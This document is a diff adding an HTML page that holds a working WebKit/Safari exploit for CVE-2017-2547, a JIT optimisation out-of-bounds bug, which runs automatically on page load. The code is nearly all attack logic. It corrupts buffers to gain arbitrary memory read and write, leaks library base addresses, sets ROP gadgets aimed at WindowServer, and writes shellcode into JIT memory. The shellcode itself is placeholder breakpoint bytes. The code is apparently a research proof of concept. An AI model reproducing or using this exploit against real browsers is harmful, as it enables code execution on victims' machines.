@@ -1,0 +1,196 @@
+<html>
+<META HTTP-EQUIV="Expires" CONTENT="0"/>
+<META HTTP-EQUIV="Pragma" CONTENT="no-cache"/>
+<META HTTP-EQUIV="cache-control" CONTENT="no-cache"/>
+<body>
+<script src='util.js'></script>
+<script>
+//P2O bug, CVE-2017-2547, B3 Optimization OOB Access.
+let u32Arrays = [];
+let u8Arrays = [];
+let abArrays = [];
+let arrays = [];
+let funcArrays = [];
+let function_to_shellcode = {};
+let ab = new ArrayBuffer(8);
+var fdv = null;
+var fab = null;
+var WebCore = {};
+var CoreGraphics = {};
+var SkyLight = {};
+var LibSystem = {};
+var CoreFoundation = {};
+var WebCoreOffset = -0x0000000014bc3bd8;
+var SkyLightOffset = 0xa85f000;
+var libkernelOffset = 0xe684000;
+var CoreGraphicsOffset = -0x6bd5000;
+var CoreFoundationOffset = -0x7070000;
+
+function make_jit_function() {
+	function getpwn(x) {
+		if(x == 0x31337) {
+			alert('seems like fail.');
+		}
+		return x;
+	}
+	for(i=0;i<10000;i++) {
+		getpwn(0);
+	}
+	return getpwn;
+}
+
+function writeShellcode(shellcode) {
+	for(var i=0;i<shellcode.length;i++)
+	{
+		fdv.setUint8(i, shellcode.charCodeAt(i));
+	}
+}
+
+function goDebug() {
+	let arr = u32Arrays[0];
+	for (let i = 0; i < 0x100000; i++) {
+	    parseInt();
+	}
+	arr[8] = 1;	
+	arr[-1] = 0x13371338;	
+}
+
+function corruptBuffer() {
+	let arr = u32Arrays[0];
+	for (let i = 0; i < 0x100000; i++) {
+	    parseInt();
+	}
+	arr[8] = 1;	
+	arr[-0x7c7bfff2] = 0xf0f0f0f0;
+	//arr[-1] = 0xf0f0f0f0; //Change to some ArrayBuffer Length.
+	for(let aa=0;aa<abArrays.length;aa++) {
+		if(abArrays[aa].byteLength == 0xf0f0f0f0) {
+			return abArrays[aa];
+		}
+	}
+	return null;
+}
+
+function changeBackingBuffer(low,high) {
+	let arr = u32Arrays[0];
+	for (let i = 0; i < 0x100000; i++) {
+	    parseInt();
+	}
+
+	arr[8] = 1;	
+	arr[-0x7c7bfff2-1] = high;
+	arr[-0x7c7bfff2-2] = low;	
+}
+/*
+//0x20d100020 => 0x7cbbfff6
+//0x20e100038 => 0x7c7bfff2
+*/
+function exploit()
+{
+	var pwn = make_jit_function();
+
+	u32Arrays[0] = new Uint32Array(0x10);
+	u32Arrays[0][0] = 0x20150303;
+	u32Arrays[0][1] = 0x20170109;
+
+	for(var x=0;x<0x4;x++) {
+		u8Arrays[x] = new Uint8Array(0x7fffff00);
+	}
+	var temp = new Array(0x400000);
+	for(var x=0;x<0x400000;x++) {
+		temp[x] = new DataView(ab,0);
+	}
+	abArrays = temp;
+
+	var webcore_addr = {};
+	var skylight_addr = {};
+	var libkernel_addr = {};
+	var coregraphic_addr = {};
+	var high, low;
+
+	//get AAR,AAW through DataView Object.
+	//alert('debug me');
+	fdv = corruptBuffer();
+	if(!fdv) {
+		document.write('fails...');
+	} else {
+		//alert('debug me22');
+		//goDebug();
+	}
+
+	var webcore_offset = 0;
+	for(var i=0;i<0x4000;i+=4) {
+		x = fdv.getUint32(i, true);
+		//document.write(x);
+		if( ((x & 0x00000fff) >>> 0) == 0xbd8) {
+			y = fdv.getUint32(i+4, true);
+			z = fdv.getUint32(i+32, true);
+			if( (((y & 0x0000ffff) >>> 0) == 0x7fff) && (((z & 0x00000fff) >>> 0) == 0xcd0)) {
+				webcore_offset = i;
+				break;
+			}
+		}
+	}
+	jit_offset = webcore_offset - 0x20;
+
+	WebCore["base"] = setAddr64({
+			low:fdv.getUint32(webcore_offset, true),
+			high:fdv.getUint32(webcore_offset+4, true)
+		}, WebCoreOffset);
+
+	SkyLight["base"] = setAddr64(WebCore["base"], SkyLightOffset);
+	LibSystem["base"] = setAddr64(WebCore["base"], libkernelOffset);
+	CoreGraphics["base"] = setAddr64(WebCore["base"], CoreGraphicsOffset);
+	CoreFoundation["base"] = setAddr64(WebCore["base"], CoreFoundationOffset);
+
+	print64("[+] WebCore Base 0x", WebCore["base"]);
+	print64("[+] SkyLight Base 0x", SkyLight["base"]);
+	print64("[+] LibSystem Base 0x", LibSystem["base"]);
+	print64("[+] CoreGraphics Base 0x", CoreGraphics["base"]);
+	print64("[+] CoreFoundation Base 0x", CoreFoundation["base"]);
+
+	//get function address.
+	SLWindowServerCreateServerPort = setAddr64(SkyLight["base"], 0x00000000001bc0c6);
+	CGSGetConnectionPortById = setAddr64(SkyLight["base"], 0x2946f);
+	SLSMainConnectionID = setAddr64(SkyLight["base"], 0x00000000000290bb);
+	GetReplyPort = setAddr64(LibSystem["base"], 0x00000000000126ca);
+	PutReplyPort = setAddr64(LibSystem["base"], 0x000000000001275b);
+	mach_msg = setAddr64(LibSystem["base"], 0x00000000000117a0);
+	vm_allocate = setAddr64(LibSystem["base"], 0x0000000000018a00);
+	mach_task_self = setAddr64(LibSystem["base"], 0x0000000000012cbd);
+	CFArrayCreateMutable = setAddr64(CoreFoundation["base"], 0x00000000000260a0);
+	CFNumberCreate = setAddr64(CoreFoundation["base"], 0x000000000000d210);
+	CFArrayAppendValue = setAddr64(CoreFoundation["base"], 0x0000000000029f90);
+	SLSSetWindowProperty = setAddr64(SkyLight["base"],  0x00000000002006ad);
+	CFStringCreateWithBytes = setAddr64(CoreFoundation["base"], 0x00000000000149e0);
+	CFArrayCreate = setAddr64(CoreFoundation["base"], 0x0000000000007430); 
+	CFPropertyListCreateData = setAddr64(CoreFoundation["base"], 0x0000000000085f50);
+
+	//set ROP gadget for windowserver.
+	POP_RDI = setAddr64(SkyLight["base"],0x0000000000044225);
+	POP_RSI = setAddr64(SkyLight["base"],0x000000000000953f);
+	POP_RDX = setAddr64(SkyLight["base"],0x000000000000aa5f);
+	MPROTECT = setAddr64(LibSystem["base"], 0x0000000000019948);
+	ADD_RSP = setAddr64(SkyLight["base"], 0x000000000000f3f4);
+
+	//now, we set backing address of ArrayBuffer to JITed area.
+	print64("[+] JITed Address 0x", {low:((fdv.getUint32(jit_offset, true) & 0xfff00000) >>> 0) + 0x16a0,high:fdv.getUint32(jit_offset+4, true),} );
+
+	var low = ((fdv.getUint32(jit_offset, true) & 0xfff00000) >>> 0) + 0x16a0;//0x17c0;
+	var high = fdv.getUint32(jit_offset+4, true);
+	changeBackingBuffer(low,high);
+
+	var shellcode = [ 
+		"\xcc\xcc\xcc\xcc",
+
+	].join("")
+
+	writeShellcode(shellcode);
+	pwn(0x31337);
+}
+
+exploit();
+
+</script>
+</body>
+</html>
